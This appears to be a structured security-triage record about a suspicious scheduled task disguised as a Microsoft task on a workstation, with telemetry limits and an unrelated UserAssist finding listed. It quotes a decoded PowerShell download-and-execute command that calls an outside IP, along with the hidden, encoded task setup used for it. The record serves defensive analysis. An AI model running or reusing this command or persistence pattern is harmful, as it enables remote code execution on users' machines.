supporting_observations.claim: At 13:41:04 UTC, hana.ito registered the alerted task, named \Microsoft\Windows\SyncCheck, on WS-HITO-01.
The task launches PowerShell with -nop, a hidden window, and an encoded command that decodes to `IEX (iwr http://203.0.113.66/s.ps1)`, indicating an attempt to retrieve and execute remote content.
The task's PowerShell action and Microsoft-style task path do not match the organization's described software-deployment convention, which uses \RB-IT\Deploy-<App> tasks running msiexec.
The task is configured to start at its registration time and to run as hana.ito at least privilege.

known_telemetry_limitations: The available records establish task registration and its configured action, but do not show whether the task executed.
The provided records do not include PowerShell process or script-block telemetry, task execution results, or evidence of a request to the URL embedded in the task.
The content served from the embedded URL and any resulting host impact are not shown.
claims_not_established: Whether the task successfully ran or retrieved and executed the remote script.

unrelated_findings: A UserAssist registry value appears to contain a ROT13-encoded path to mstsc.exe, suggesting possible Remote Desktop client use on a staff workstation. This is separate from the alerted task; the record alone does not establish a remote connection. Record: S23-00064.
